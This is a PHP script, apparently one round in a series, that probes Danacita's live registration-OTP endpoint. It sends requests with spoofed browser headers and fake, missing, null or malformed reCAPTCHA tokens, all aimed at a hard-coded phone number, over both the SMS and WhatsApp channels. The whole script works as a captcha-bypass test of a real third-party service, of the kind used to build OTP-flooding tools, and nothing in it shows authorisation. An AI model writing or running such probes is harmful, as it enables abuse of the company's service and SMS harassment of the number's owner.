<?php
// Ronde 15: apakah recaptcha Danacita divalidasi server, atau cuma dicek "ada isinya"?
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$L = '083822461998';
$U = 'https://api.danacita.co.id/api/atlas/v1/auth/registration-otp-request';

function post($u, $b) {
  $ch = curl_init();
  curl_setopt_array($ch, [CURLOPT_URL => $u, CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $b, CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_TIMEOUT => 30, CURLOPT_ENCODING => '',
    CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'Accept: application/json, text/plain, */*',
      'Origin: https://app.danacita.co.id', 'Referer: https://app.danacita.co.id/', 'User-Agent: ' .
      'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36']]);
  $r = (string) curl_exec($ch); $c = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  $f = trim(preg_replace('/\s+/', ' ', $r));
  return sprintf("[%d] %s", $c, $f !== '' ? substr($f, 0, 200) : '(kosong)');
}

$CASES = [
  'token-palsu'   => '{"username":"' . $L . '","recaptcha":"AAAABBBBccccDDDD","notif_channel_mode":"sms","is_white_label":false}',
  'token-panjang' => '{"username":"' . $L . '","recaptcha":"' . str_repeat('a', 120) . '","notif_channel_mode":"sms","is_white_label":false}',
  'tanpa-field'   => '{"username":"' . $L . '","notif_channel_mode":"sms","is_white_label":false}',
  'recaptcha-null'=> '{"username":"' . $L . '","recaptcha":null,"notif_channel_mode":"sms","is_white_label":false}',
  'wa-mode'       => '{"username":"' . $L . '","recaptcha":"' . str_repeat('a', 120) . '","notif_channel_mode":"wa","is_white_label":false}',
  'wrong-type'    => '{"username":"' . $L . '","recaptcha":123,"notif_channel_mode":"sms","is_white_label":false}',
];
foreach ($CASES as $n => $b) {
  printf("%-15s %s\n", $n, post($U, $b));
  sleep(12);
}
echo "\n";
